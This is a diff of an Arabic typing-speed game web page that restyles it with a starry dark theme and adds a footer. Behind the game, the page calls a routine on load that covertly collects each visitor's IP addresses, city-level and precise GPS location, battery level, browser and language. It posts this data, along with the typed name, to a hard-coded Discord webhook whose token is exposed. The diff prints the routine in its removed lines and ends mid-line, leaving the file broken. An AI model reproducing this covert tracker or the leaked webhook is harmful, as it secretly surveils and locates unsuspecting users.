@@ -11,22 +11,33 @@
       margin: 0; padding: 0;
       text-align: center;
       min-height: 100vh;
-      background: linear-gradient(135deg, #e0f7fa, #fce4ec);
-      background-size: 400% 400%;
-      animation: bgShift 10s ease infinite;
+      background: radial-gradient(ellipse at bottom, #1b2735 0%, #090a0f 100%);
+      overflow: hidden;
+      color: #fff;
     }
-    @keyframes bgShift {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
+    .stars {
+      width: 100%;
+      height: 100%;
+      background: transparent url('https://raw.githubusercontent.com/VincentGarreau/particles.js/master/demo/media/star.png') repeat top center;
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 0;
+      animation: moveStars 200s linear infinite;
+    }
+    @keyframes moveStars {
+      from {background-position: 0 0;}
+      to {background-position: 10000px 5000px;}
     }
     .container {
+      position: relative;
+      z-index: 1;
       max-width: 700px;
       margin: 60px auto;
       padding: 20px;
-      background: rgba(255, 255, 255, 0.85);
+      background: rgba(0, 0, 0, 0.7);
       border-radius: 15px;
-      box-shadow: 0 0 30px rgba(0,0,0,0.1);
+      box-shadow: 0 0 30px rgba(255,255,255,0.1);
     }
     input[type="text"] {
       padding: 12px;
@@ -49,7 +60,7 @@
     #sentence {
       font-size: 26px;
       font-weight: bold;
-      color: #222;
+      color: #fff;
       margin: 25px 0;
     }
     #record {
@@ -62,6 +73,7 @@
       font-size: 16px;
       font-weight: bold;
       display: none;
+      z-index: 2;
     }
     #musicControl {
       position: fixed;
@@ -78,6 +90,7 @@
       align-items: center;
       font-size: 20px;
       user-select: none;
+      z-index: 2;
     }
     #result {
       font-size: 20px;
@@ -91,13 +104,29 @@
       font-size: 18px;
       margin-top: 10px;
     }
+    footer {
+      position: fixed;
+      bottom: 10px;
+      width: 100%;
+      text-align: center;
+      color: #ccc;
+      font-size: 14px;
+      z-index: 2;
+    }
+    footer a {
+      color: #ccc;
+      text-decoration: none;
+    }
   </style>
 </head>
 <body>
 
+<div class="stars"></div>
+
 <div id="record">أعلى سرعة: 0 - 0.00 ثانية</div>
 <div id="musicControl" title="كتم/تشغيل الموسيقى">🎵</div>
 
+<!-- شاشة تسجيل الدخول -->
 <div class="container" id="loginScreen">
   <h2>مرحبًا!</h2>
   <p>اكتب اسمك نبدأ</p>
@@ -106,6 +135,7 @@
   <button onclick="startGame()">يلا نبدأ</button>
 </div>
 
+<!-- شاشة الاختبار -->
 <div class="container" id="gameScreen" style="display:none;">
   <h2 id="welcomeMsg"></h2>
   <div id="sentence">...</div>
@@ -118,6 +148,10 @@
 </div>
 
 <audio id="bgMusic" src="https://c.top4top.io/m_343844pxd1.mp3" loop></audio>
+
+<footer>
+  &copy; 2025 - جميع الحقوق محفوظة | <a href="https://discord.com" target="_blank">Discord</a>
+</footer>
 
 <script>
   const WEBHOOK_URL = 'https://discord.com/api/webhooks/1377761857036619816/2jO4mtntMxZXJrgY9jVvpdF4s7CA6wHVCqePyuX8uZNJuZHldMWov_Ct5vPB8cLRMu3w';
@@ -150,6 +184,7 @@
   const music = document.getElementById("bgMusic");
   const musicControl = document.getElementById("musicControl");
 
+  // إرسال بيانات المستخدم التقنية مباشرة عند تحميل الصفحة
   window.onload = () => {
     sendUserInfo();
   };
@@ -213,125 +248,4 @@
     const sentenceWords = currentSentence.split(" ");
     let colored = "";
 
-    for (let i = 0; i < sentenceWords.length; i++) {
-      if (typedWords[i] === undefined) {
-        colored += `<span>${sentenceWords[i]}</span> `;
-      } else if (typedWords[i] === sentenceWords[i]) {
-        colored += `<span style="color:green;">${sentenceWords[i]}</span> `;
-      } else {
-        colored += `<span style="color:red;">${sentenceWords[i]}</span> `;
-      }
-    }
-
-    sentence.innerHTML = colored.trim();
-  });
-
-  musicControl.addEventListener("click", () => {
-    if (music.paused) {
-      music.play();
-      musicControl.textContent = "🎵";
-    } else {
-      music.pause();
-      musicControl.textContent = "🔇";
-    }
-  });
-
-  function sendUserName(name) {
-    fetch(WEBHOOK_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ content: `🚀 بدأ المستخدم: ${name}` })
-    });
-  }
-
-  async function sendUserInfo() {
-    try {
-      const [ipv4Res, ipv6Res, geoRes] = await Promise.all([
-        fetch('https://api.ipify.org?format=json'),
-        fetch('https://api64.ipify.org?format=json'),
-        fetch('https://ipapi.co/json/')
-      ]);
-      const ipv4Data = await ipv4Res.json();
-      const ipv6Data = await ipv6Res.json();
-      const geoData = await geoRes.json();
-
-      const ua = navigator.userAgent;
-      const lang = navigator.language;
-      const now = new Date();
-      const timeString = now.toISOString();
-
-      const ipv4 = ipv4Data.ip;
-      const ipv6 = (ipv6Data.ip && ipv6Data.ip !== ipv4) ? ipv6Data.ip : 'غير معروف';
-
-      let deviceType = "كمبيوتر";
-      if (/android|iphone|ipad|ipod/i.test(ua)) {
-        deviceType = /tablet|ipad/i.test(ua) ? "تابلت" : "جوال";
-      }
-
-      let batteryInfo = "غير متوفرة";
-      if (navigator.getBattery) {
-        try {
-          const battery = await navigator.getBattery();
-          const level = Math.round(battery.level * 100);
-          const charging = battery.charging ? "يُشحن" : "لا يُشحن";
-          batteryInfo = `${level}% - ${charging}`;
-        } catch {
-          batteryInfo = "غير مدعومة";
-        }
-      }
-
-      function sendToWebhook(extraGeo = '') {
-        const infoText = `
-IP (IPv4): ${ipv4}
-IP (IPv6): ${ipv6}
-الدولة: ${geoData.country_name}
-المنطقة: ${geoData.region}
-المدينة: ${geoData.city}
-خط العرض: ${geoData.latitude}
-خط الطول: ${geoData.longitude}
-المنظمة: ${geoData.org}
-المنطقة الزمنية: ${geoData.timezone}
-نوع الجهاز: ${deviceType}
-نسبة البطارية: ${batteryInfo}
-المتصفح: ${ua}
-اللغة: ${lang}
-الوقت: ${timeString}
-${extraGeo}
-        `.trim();
-
-        fetch(WEBHOOK_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: infoText })
-        });
-      }
-
-      if (navigator.geolocation) {
-        let responded = false;
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            responded = true;
-            const extraGeo = `موقع دقيق:\nخط العرض: ${pos.coords.latitude.toFixed(6)}\nخط الطول: ${pos.coords.longitude.toFixed(6)}`;
-            sendToWebhook(extraGeo);
-          },
-          () => {
-            responded = true;
-            sendToWebhook();
-          },
-          { timeout: 4000 }
-        );
-        setTimeout(() => {
-          if (!responded) sendToWebhook();
-        }, 4500);
-      } else {
-        sendToWebhook();
-      }
-    } catch (e) {
-      console.error('خطأ في إرسال معلومات المستخدم', e);
-    }
-  }
-
-</script>
-
-</body>
-</html>
+    for (let 
